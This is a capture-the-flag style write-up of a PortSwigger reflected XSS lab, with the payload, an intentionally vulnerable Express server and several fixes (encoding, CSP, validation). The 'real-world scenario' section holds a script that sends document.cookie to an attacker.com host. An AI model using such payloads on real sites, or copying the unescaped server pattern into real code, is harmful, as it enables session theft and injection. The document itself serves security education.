# Reflected XSS into HTML Context (Nothing Encoded)

**Platform:** PortSwigger Web Security Academy  
**Type:** Reflected XSS  
**Difficulty:** Apprentice  
**Payload:** `<script>alert(1)</script>`  
**Date:** September 2026

---

## Objective

Demonstrate reflected XSS by injecting JavaScript into a search parameter that executes immediately in the browser.

---

## Vulnerability

The search box reflects user input directly into HTML without encoding or sanitization.

**Vulnerable Code Pattern:**
```html
<!-- Backend generates this without escaping -->
<h1>You searched for: USER_INPUT</h1>
```

**Developer Mistakes:**
- No output encoding
- Direct HTML injection
- No input filtering
- No Content Security Policy (CSP)

---

## How It Works

```
User enters:  <script>alert(1)</script>
Server reflects: "You searched for: <script>alert(1)</script>"
Browser executes: Script tag → alert(1) popup ✅
```

---

## My Attack Methodology

**Step 1 — Confirm Reflection**
- Search: `hello123`
- Verify: Input appears on page ✅

**Step 2 — Test Encoding**
- Search: `<hello>`
- Result: Shows literally (not `&lt;hello&gt;`) → **No encoding** ✅

**Step 3 — Inject Payload**
- Payload: `<script>alert(1)</script>`
- Result: Popup appears → **XSS confirmed** 🎯

---

## Payload Breakdown

**Normal Search:**
```html
<h1>You searched for: hello</h1>
```

**With XSS Payload:**
```html
<h1>You searched for: <script>alert(1)</script></h1>
```

**Browser Interpretation:**
- Heading opens
- Text: "You searched for:"
- **`<script>` tag detected → JavaScript executes**
- Heading closes

The browser treats `<script>` as an actual HTML tag, not data.

---

## Why It's Vulnerable

```javascript
// ❌ VULNERABLE - No encoding (Node.js + Express)
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  const userInput = req.query.search;
  res.send(`<h1>You searched for: ${userInput}</h1>`);
});

app.listen(3000, () => {
  console.log('Vulnerable server running on http://localhost:3000');
});

// Attack demonstration:
// 1. User visits: http://localhost:3000/search?search=<script>alert(1)</script>
// 2. Express receives: req.query.search = "<script>alert(1)</script>"
// 3. Server responds: <h1>You searched for: <script>alert(1)</script></h1>
// 4. Browser parses HTML and executes: alert(1)
// 5. Popup appears! 💥
```

---

## Real-World Attack Scenario

**Attacker's Link:**
```
https://vulnerable-site.com/search?q=<script>
fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```

**Attack Flow:**
1. Attacker sends malicious link (email, chat, social media)
2. Victim clicks the link
3. Page reflects payload
4. JavaScript steals session cookie
5. Attacker impersonates victim ⚠️

**Severity:** Medium (requires victim interaction)

---

## Prevention

### Primary Defense — HTML Encode Output

```javascript
// ✅ SECURE - Using he library for HTML encoding
const express = require('express');
const he = require('he');
const app = express();

app.get('/search', (req, res) => {
  const userInput = req.query.search;
  const encodedInput = he.encode(userInput);
  res.send(`<h1>You searched for: ${encodedInput}</h1>`);
});

app.listen(3000, () => {
  console.log('Secure server running on http://localhost:3000');
});
```

**Install the `he` library:**
```bash
npm install he
```

**What Encoding Does:**
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `&` → `&amp;`

**Result:** `<script>` becomes `&lt;script&gt;` (displayed as text, not executed)

### Alternative — Manual HTML Escaping Function

```javascript
// ✅ SECURE - Manual encoding function (no dependencies)
const express = require('express');
const app = express();

function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return str.replace(/[&<>"']/g, (m) => map[m]);
}

app.get('/search', (req, res) => {
  const userInput = req.query.search;
  const encodedInput = escapeHtml(userInput);
  res.send(`<h1>You searched for: ${encodedInput}</h1>`);
});

app.listen(3000, () => {
  console.log('Secure server running on http://localhost:3000');
});
```

### Secondary Defense — Content Security Policy

```javascript
// ✅ SECURE - Add CSP header middleware
const express = require('express');
const he = require('he');
const app = express();

// CSP middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});

app.get('/search', (req, res) => {
  const userInput = req.query.search;
  const encodedInput = he.encode(userInput);
  res.send(`<h1>You searched for: ${encodedInput}</h1>`);
});

app.listen(3000, () => {
  console.log('Secure server with CSP running on http://localhost:3000');
});
```

**Or in HTML meta tag:**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### Input Validation (Additional Layer)

```javascript
// ✅ SECURE - Whitelist validation + encoding
const express = require('express');
const he = require('he');
const app = express();

// Whitelist approach - only allow alphanumeric + spaces
function isValidInput(str) {
  return /^[a-zA-Z0-9\s]+$/.test(str);
}

app.get('/search', (req, res) => {
  const userInput = req.query.search;
  
  if (!userInput || !isValidInput(userInput)) {
    return res.status(400).send('Invalid search query');
  }
  
  const encodedInput = he.encode(userInput);
  res.send(`<h1>You searched for: ${encodedInput}</h1>`);
});

app.listen(3000, () => {
  console.log('Secure server with validation running on http://localhost:3000');
});
```

---

## Reflected XSS Characteristics

| Aspect | Detail |
|--------|--------|
| **Storage** | Not stored in database |
| **Persistence** | Only lasts for single request |
| **Trigger** | User must click malicious link |
| **URL shows payload** | Yes (visible in address bar) |
| **Affects multiple users** | No (only who clicks link) |
| **Stealth** | Low (payload in URL) |

---

## Key Takeaway

Reflected XSS is the simplest type — user input → directly in HTML → executed.

**The Golden Rule:** Never trust user input. Always encode output.
